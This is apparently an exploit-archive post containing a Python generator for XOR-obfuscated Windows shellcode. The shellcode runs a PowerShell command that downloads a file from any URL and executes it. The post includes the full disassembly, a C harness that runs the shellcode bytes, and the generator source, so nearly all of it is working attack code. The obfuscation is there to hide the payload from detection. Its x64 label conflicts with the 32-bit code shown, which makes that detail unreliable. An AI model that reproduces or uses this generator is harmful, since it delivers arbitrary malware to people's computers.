#Title: Obfuscated Shellcode Windows x64 Download And Execute [Use PowerShell] - Generator
#length: Dynamic ! depend on url and filename
#Date: 20 January 2015
#Author: Ali Razmjoo
#tested On: Windows 7 x64 ultimate
#WinExec =>  0x769e2c91
#ExitProcess =>  0x769679f8
#====================================
#Execute :
#powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://tartarus.org/~simon/putty-prerel-snapshots/x86/putty.exe', 'D:\Ali.exe')};D:\Ali.exe"
#====================================
#Ali Razmjoo , ['Ali.Razmjoo1994@Gmail.Com','Ali@Z3r0D4y.Com']
#Thanks to my friends , Dariush Nasirpour and Ehsan Nezami
####################################################
 
#How it work ?
'''
 
C:\Users\Ali\Desktop>python "Windows x64 Download And Execute.py"
Enter url
Example: http://z3r0d4y.com/file.exe
Enter:http://tartarus.org/~simon/putty-prerel-snapshots/x86/putty.exe
Enter filename
Example: D:\file.exe
Enter:D:\Ali_test.exe
 
C:\Users\Ali\Desktop>nasm -f elf shellcode.asm -o shellcode.o
 
C:\Users\Ali\Desktop>objdump -D shellcode.o
 
shellcode.o:     file format elf32-i386
 
 
Disassembly of section .text:
 
00000000 <.text>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   b8 3f 02 02 65          mov    $0x6502023f,%eax
   8:   bb 5a 7a 67 47          mov    $0x47677a5a,%ebx
   d:   31 d8                   xor    %ebx,%eax
   f:   50                      push   %eax
  10:   b8 57 46 49 5d          mov    $0x5d494657,%eax
  15:   bb 32 35 3d 73          mov    $0x733d3532,%ebx
  1a:   31 d8                   xor    %ebx,%eax
  1c:   50                      push   %eax
  1d:   b8 1c 08 39 3f          mov    $0x3f39081c,%eax
  22:   bb 70 61 66 4b          mov    $0x4b666170,%ebx
  27:   31 d8                   xor    %ebx,%eax
  29:   50                      push   %eax
  2a:   b8 22 54 3e 76          mov    $0x763e5422,%eax
  2f:   bb 66 6e 62 37          mov    $0x37626e66,%ebx
  34:   31 d8                   xor    %ebx,%eax
  36:   50                      push   %eax
  37:   b8 15 18 19 74          mov    $0x74191815,%eax
  3c:   bb 32 31 64 4f          mov    $0x4f643132,%ebx
  41:   31 d8                   xor    %ebx,%eax
  43:   50                      push   %eax
  44:   b8 49 32 25 52          mov    $0x52253249,%eax
  49:   bb 67 57 5d 37          mov    $0x375d5767,%ebx
  4e:   31 d8                   xor    %ebx,%eax
  50:   50                      push   %eax
  51:   b8 1d 30 17 39          mov    $0x3917301d,%eax
  56:   bb 69 55 64 4d          mov    $0x4d645569,%ebx
  5b:   31 d8                   xor    %ebx,%eax
  5d:   50                      push   %eax
  5e:   b8 34 0b 1d 14          mov    $0x141d0b34,%eax
  63:   bb 75 67 74 4b          mov    $0x4b746775,%ebx
  68:   31 d8                   xor    %ebx,%eax
  6a:   50                      push   %eax
  6b:   b8 0a 27 5b 28          mov    $0x285b270a,%eax
  70:   bb 2d 63 61 74          mov    $0x7461632d,%ebx
  75:   31 d8                   xor    %ebx,%eax
  77:   50                      push   %eax
  78:   b8 2c 7e 62 65          mov    $0x65627e2c,%eax
  7d:   bb 49 59 4e 45          mov    $0x454e5949,%ebx
  82:   31 d8                   xor    %ebx,%eax
  84:   50                      push   %eax
  85:   b8 29 74 2c 29          mov    $0x292c7429,%eax
  8a:   bb 50 5a 49 51          mov    $0x51495a50,%ebx
  8f:   31 d8                   xor    %ebx,%eax
  91:   50                      push   %eax
  92:   b8 1f 00 11 1e          mov    $0x1e11001f,%eax
  97:   bb 6f 75 65 6a          mov    $0x6a65756f,%ebx
  9c:   31 d8                   xor    %ebx,%eax
  9e:   50                      push   %eax
  9f:   b8 3e 72 02 5f          mov    $0x5f02723e,%eax
  a4:   bb 46 4a 34 70          mov    $0x70344a46,%ebx
  a9:   31 d8                   xor    %ebx,%eax
  ab:   50                      push   %eax
  ac:   b8 57 46 11 45          mov    $0x45114657,%eax
  b1:   bb 38 32 62 6a          mov    $0x6a623238,%ebx
  b6:   31 d8                   xor    %ebx,%eax
  b8:   50                      push   %eax
  b9:   b8 23 24 1f 3b          mov    $0x3b1f2423,%eax
  be:   bb 42 54 6c 53          mov    $0x536c5442,%ebx
  c3:   31 d8                   xor    %ebx,%eax
  c5:   50                      push   %eax
  c6:   b8 14 6c 40 03          mov    $0x3406c14,%eax
  cb:   bb 78 41 33 6d          mov    $0x6d334178,%ebx
  d0:   31 d8                   xor    %ebx,%eax
  d2:   50                      push   %eax
  d3:   b8 1a 2f 00 02          mov    $0x2002f1a,%eax
  d8:   bb 68 4a 72 67          mov    $0x67724a68,%ebx
  dd:   31 d8                   xor    %ebx,%eax
  df:   50                      push   %eax
  e0:   b8 2f 23 6b 16          mov    $0x166b232f,%eax
  e5:   bb 5b 5a 46 66          mov    $0x66465a5b,%ebx
  ea:   31 d8                   xor    %ebx,%eax
  ec:   50                      push   %eax
  ed:   b8 5d 28 0c 26          mov    $0x260c285d,%eax
  f2:   bb 72 58 79 52          mov    $0x52795872,%ebx
  f7:   31 d8                   xor    %ebx,%eax
  f9:   50                      push   %eax
  fa:   b8 25 23 05 18          mov    $0x18052325,%eax
  ff:   bb 4c 4e 6a 76          mov    $0x766a4e4c,%ebx
 104:   31 d8                   xor    %ebx,%eax
 106:   50                      push   %eax
 107:   b8 30 7a 0d 17          mov    $0x170d7a30,%eax
 10c:   bb 57 55 73 64          mov    $0x64735557,%ebx
 111:   31 d8                   xor    %ebx,%eax
 113:   50                      push   %eax
 114:   b8 40 6a 1e 1a          mov    $0x1a1e6a40,%eax
 119:   bb 33 44 71 68          mov    $0x68714433,%ebx
 11e:   31 d8                   xor    %ebx,%eax
 120:   50                      push   %eax
 121:   b8 0d 37 0b 31          mov    $0x310b370d,%eax
 126:   bb 79 56 79 44          mov    $0x44795679,%ebx
 12b:   31 d8                   xor    %ebx,%eax
 12d:   50                      push   %eax
 12e:   b8 42 36 37 24          mov    $0x24373642,%eax
 133:   bb 6d 42 56 56          mov    $0x5656426d,%ebx
 138:   31 d8                   xor    %ebx,%eax
 13a:   50                      push   %eax
 13b:   b8 47 3d 6e 49          mov    $0x496e3d47,%eax
 140:   bb 33 4d 54 66          mov    $0x66544d33,%ebx
 145:   31 d8                   xor    %ebx,%eax
 147:   50                      push   %eax
 148:   b8 6f 52 01 3f          mov    $0x3f01526f,%eax
 14d:   bb 47 75 69 4b          mov    $0x4b697547,%ebx
 152:   31 d8                   xor    %ebx,%eax
 154:   50                      push   %eax
 155:   b8 08 3a 22 5d          mov    $0x5d223a08,%eax
 15a:   bb 4e 53 4e 38          mov    $0x384e534e,%ebx
 15f:   31 d8                   xor    %ebx,%eax
 161:   50                      push   %eax
 162:   b8 1e 1a 55 59          mov    $0x59551a1e,%eax
 167:   bb 72 75 34 3d          mov    $0x3d347572,%ebx
 16c:   31 d8                   xor    %ebx,%eax
 16e:   50                      push   %eax
 16f:   b8 23 21 5a 16          mov    $0x165a2123,%eax
 174:   bb 67 4e 2d 78          mov    $0x782d4e67,%ebx
 179:   31 d8                   xor    %ebx,%eax
 17b:   50                      push   %eax
 17c:   b8 25 22 64 63          mov    $0x63642225,%eax
 181:   bb 4b 56 4d 4d          mov    $0x4d4d564b,%ebx
 186:   31 d8                   xor    %ebx,%eax
 188:   50                      push   %eax
 189:   b8 09 07 39 31          mov    $0x31390709,%eax
 18e:   bb 4a 6b 50 54          mov    $0x54506b4a,%ebx
 193:   31 d8                   xor    %ebx,%eax
 195:   50                      push   %eax
 196:   b8 79 62 48 3f          mov    $0x3f486279,%eax
 19b:   bb 57 35 2d 5d          mov    $0x5d2d3557,%ebx
 1a0:   31 d8                   xor    %ebx,%eax
 1a2:   50                      push   %eax
 1a3:   b8 4f 21 36 49          mov    $0x4936214f,%eax
 1a8:   bb 6f 6f 53 3d          mov    $0x3d536f6f,%ebx
 1ad:   31 d8                   xor    %ebx,%eax
 1af:   50                      push   %eax
 1b0:   b8 0b 20 14 20          mov    $0x2014200b,%eax
 1b5:   bb 61 45 77 54          mov    $0x54774561,%ebx
 1ba:   31 d8                   xor    %ebx,%eax
 1bc:   50                      push   %eax
 1bd:   b8 13 10 05 23          mov    $0x23051013,%eax
 1c2:   bb 64 3d 4a 41          mov    $0x414a3d64,%ebx
 1c7:   31 d8                   xor    %ebx,%eax
 1c9:   50                      push   %eax
 1ca:   b8 15 4b 1b 1d          mov    $0x1d1b4b15,%eax
 1cf:   bb 35 63 55 78          mov    $0x78556335,%ebx
 1d4:   31 d8                   xor    %ebx,%eax
 1d6:   50                      push   %eax
 1d7:   b8 76 15 54 09          mov    $0x9541576,%eax
 1dc:   bb 54 33 74 72          mov    $0x72743354,%ebx
 1e1:   31 d8                   xor    %ebx,%eax
 1e3:   50                      push   %eax
 1e4:   b8 00 0f 10 66          mov    $0x66100f00,%eax
 1e9:   bb 61 61 74 46          mov    $0x46746161,%ebx
 1ee:   31 d8                   xor    %ebx,%eax
 1f0:   50                      push   %eax
 1f1:   b8 26 52 26 58          mov    $0x58265226,%eax
 1f6:   bb 45 3d 4b 35          mov    $0x354b3d45,%ebx
 1fb:   31 d8                   xor    %ebx,%eax
 1fd:   50                      push   %eax
 1fe:   b8 58 21 61 1b          mov    $0x1b612158,%eax
 203:   bb 34 4d 41 36          mov    $0x36414d34,%ebx
 208:   31 d8                   xor    %ebx,%eax
 20a:   50                      push   %eax
 20b:   b8 4f 21 50 54          mov    $0x5450214f,%eax
 210:   bb 3d 52 38 31          mov    $0x3138523d,%ebx
 215:   31 d8                   xor    %ebx,%eax
 217:   50                      push   %eax
 218:   b8 09 1c 32 27          mov    $0x27321c09,%eax
 21d:   bb 79 73 45 42          mov    $0x42457379,%ebx
 222:   31 d8                   xor    %ebx,%eax
 224:   50                      push   %eax
 225:   89 e0                   mov    %esp,%eax
 227:   bb 41 41 41 01          mov    $0x1414141,%ebx
 22c:   c1 eb 08                shr    $0x8,%ebx
 22f:   c1 eb 08                shr    $0x8,%ebx
 232:   c1 eb 08                shr    $0x8,%ebx
 235:   53                      push   %ebx
 236:   50                      push   %eax
 237:   bb 91 2c c6 75          mov    $0x75c62c91,%ebx
 23c:   ff d3                   call   *%ebx
 23e:   bb f8 79 be 75          mov    $0x75be79f8,%ebx
 243:   ff d3                   call   *%ebx
 
 
#you have your shellcode now; dump it using below command:
# objdump -d ./shellcode.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
=======================================
shellcode.c
 
#include <stdio.h>
#include <string.h>
int main(){
unsigned char shellcode[]= "\x31\xc0\x50\xb8\x3f\x02\x02\x65\xbb\x5a\x7a\x67\x47\x31\xd8\x50\xb8\x57\x46\x49\x5d\xbb\x32\x35\x3d\x73\x31\xd8\x50\xb8\x1c\x08\x39\x3f\xbb\x70\x61\x66\x4b\x31\xd8\x50\xb8\x22\x54\x3e\x76\xbb\x66\x6e\x62\x37\x31\xd8\x50\xb8\x15\x18\x19\x74\xbb\x32\x31\x64\x4f\x31\xd8\x50\xb8\x49\x32\x25\x52\xbb\x67\x57\x5d\x37\x31\xd8\x50\xb8\x1d\x30\x17\x39\xbb\x69\x55\x64\x4d\x31\xd8\x50\xb8\x34\x0b\x1d\x14\xbb\x75\x67\x74\x4b\x31\xd8\x50\xb8\x0a\x27\x5b\x28\xbb\x2d\x63\x61\x74\x31\xd8\x50\xb8\x2c\x7e\x62\x65\xbb\x49\x59\x4e\x45\x31\xd8\x50\xb8\x29\x74\x2c\x29\xbb\x50\x5a\x49\x51\x31\xd8\x50\xb8\x1f\x00\x11\x1e\xbb\x6f\x75\x65\x6a\x31\xd8\x50\xb8\x3e\x72\x02\x5f\xbb\x46\x4a\x34\x70\x31\xd8\x50\xb8\x57\x46\x11\x45\xbb\x38\x32\x62\x6a\x31\xd8\x50\xb8\x23\x24\x1f\x3b\xbb\x42\x54\x6c\x53\x31\xd8\x50\xb8\x14\x6c\x40\x03\xbb\x78\x41\x33\x6d\x31\xd8\x50\xb8\x1a\x2f\x00\x02\xbb\x68\x4a\x72\x67\x31\xd8\x50\xb8\x2f\x23\x6b\x16\xbb\x5b\x5a\x46\x66\x31\xd8\x50\xb8\x5d\x28\x0c\x26\xbb\x72\x58\x79\x52\x31\xd8\x50\xb8\x25\x23\x05\x18\xbb\x4c\x4e\x6a\x76\x31\xd8\x50\xb8\x30\x7a\x0d\x17\xbb\x57\x55\x73\x64\x31\xd8\x50\xb8\x40\x6a\x1e\x1a\xbb\x33\x44\x71\x68\x31\xd8\x50\xb8\x0d\x37\x0b\x31\xbb\x79\x56\x79\x44\x31\xd8\x50\xb8\x42\x36\x37\x24\xbb\x6d\x42\x56\x56\x31\xd8\x50\xb8\x47\x3d\x6e\x49\xbb\x33\x4d\x54\x66\x31\xd8\x50\xb8\x6f\x52\x01\x3f\xbb\x47\x75\x69\x4b\x31\xd8\x50\xb8\x08\x3a\x22\x5d\xbb\x4e\x53\x4e\x38\x31\xd8\x50\xb8\x1e\x1a\x55\x59\xbb\x72\x75\x34\x3d\x31\xd8\x50\xb8\x23\x21\x5a\x16\xbb\x67\x4e\x2d\x78\x31\xd8\x50\xb8\x25\x22\x64\x63\xbb\x4b\x56\x4d\x4d\x31\xd8\x50\xb8\x09\x07\x39\x31\xbb\x4a\x6b\x50\x54\x31\xd8\x50\xb8\x79\x62\x48\x3f\xbb\x57\x35\x2d\x5d\x31\xd8\x50\xb8\x4f\x21\x36\x49\xbb\x6f\x6f\x53\x3d\x31\xd8\x50\xb8\x0b\x20\x14\x20\xbb\x61\x45\x77\x54\x31\xd8\x50\xb8\x13\x10\x05\x23\xbb\x64\x3d\x4a\x41\x31\xd8\x50\xb8\x15\x4b\x1b\x1d\xbb\x35\x63\x55\x78\x31\xd8\x50\xb8\x76\x15\x54\x09\xbb\x54\x33\x74\x72\x31\xd8\x50\xb8\x00\x0f\x10\x66\xbb\x61\x61\x74\x46\x31\xd8\x50\xb8\x26\x52\x26\x58\xbb\x45\x3d\x4b\x35\x31\xd8\x50\xb8\x58\x21\x61\x1b\xbb\x34\x4d\x41\x36\x31\xd8\x50\xb8\x4f\x21\x50\x54\xbb\x3d\x52\x38\x31\x31\xd8\x50\xb8\x09\x1c\x32\x27\xbb\x79\x73\x45\x42\x31\xd8\x50\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\x91\x2c\xc6\x75\xff\xd3\xbb\xf8\x79\xbe\x75\xff\xd3";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}
 
=======================================
 
C:\Users\Ali\Desktop>gcc shellcode.c -o shellcode.exe
 
C:\Users\Ali\Desktop>shellcode.exe
Length: 148
 
 
C:\Users\Ali\Desktop>
 
#notice : when program exit, you must wait 2-3 second , it will finish download and execute file after 2-3 second 
 
'''
import random,binascii
chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789=[]-'
p1 = '''xor eax,eax
push eax 
'''
p2 = '''
mov eax,esp
mov ebx,0x01414141
shr ebx,0x08
shr ebx,0x08
shr ebx,0x08
push ebx
push eax
mov ebx,0x75c62c91
call ebx
mov ebx,0x75be79f8
call ebx
'''
sen1 = str(raw_input('Enter url\nExample: http://z3r0d4y.com/file.exe \nEnter:'))
sen1 = sen1.rsplit()
sen1 = sen1[0]
sen2 = str(raw_input('Enter filename\nExample: D:\\file.exe\nEnter:'))
sen2 = sen2.rsplit()
sen2 = sen2[0]
sen = '''powershell -command "& { (New-Object Net.WebClient).DownloadFile('%s', '%s')};%s"''' %(sen1,sen2,sen2)
m = 0
for word in sen:
	m += 1
m = m - 1
stack = ''
while(m>=0):
	stack += sen[m]
	m -= 1
stack = stack.encode('hex')
skip = 1
if len(stack) % 8 == 0:
	skip = 0
if skip is 1:
	stack = '00' + stack
	if len(stack) % 8 == 0:
		skip = 0
	if skip is 1:
		stack = '00' + stack
		if len(stack) % 8 == 0:
			skip = 0
	if skip is 1:
		stack = '00' + stack
		if len(stack) % 8 == 0:
			skip = 0
if len(stack) % 8 == 0:
	zxzxzxz = 0
m = len(stack) / 8
c = 0
n = 0
z = 8
shf = open('shellcode.asm','w')
shf.write(p1)
shf.close()
shf = open('shellcode.asm','a')
while(c<m):
	v = 'push 0x' + stack[n:z]
	skip = 0
	if '0x000000' in v:
		skip = 1
		q1 = v[13:]
		v = 'push 0x' + q1 + '414141' + '\n' + 'pop eax\nshr eax,0x08\nshr eax,0x08\nshr eax,0x08\npush eax\n'
	if '0x0000' in v:
		skip = 1
		q1 = v[11:]
		v = 'push 0x' + q1 + '4141' + '\n' + 'pop eax\nshr eax,0x08\nshr eax,0x08\npush eax\n'
	if '0x00' in v:
		skip = 1
		q1 = v[9:]
		v = 'push 0x' + q1 + '41' + '\n' + 'pop eax\nshr eax,0x08\npush eax\n'
	if skip is 1:
		shf.write(v)
	if skip is 0:
		v = v.rsplit()
		zzz = ''
		for w in v:
			if '0x' in w:
				zzz = str(w)
		s1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
		s1 = '0x%s'%s1
		data = "%x" % (int(zzz, 16) ^ int(s1, 16))
		v =  'mov eax,0x%s\nmov ebx,%s\nxor eax,ebx\npush eax\n'%(data,s1)
		shf.write(v)
	n += 8
	z += 8
	c += 1
shf.write(p2)
shf.close()